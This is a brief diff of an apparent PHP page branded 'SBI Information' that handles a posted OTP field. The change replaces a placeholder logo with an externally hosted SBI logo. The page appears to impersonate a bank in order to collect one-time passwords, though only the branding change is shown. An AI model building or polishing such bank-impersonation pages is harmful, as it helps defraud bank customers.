@@ -39,7 +39,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
 <body>
     <div class="container">
         <div class="header">
-            <img src="path_to_sbi_logo.png" alt="SBI Logo"> 
+            <img src="https://mrfidal.github.io/security/sbi/SBI-logo.svg" alt="SBI Logo"> 
             <h1>SBI Information</h1>
         </div>
 
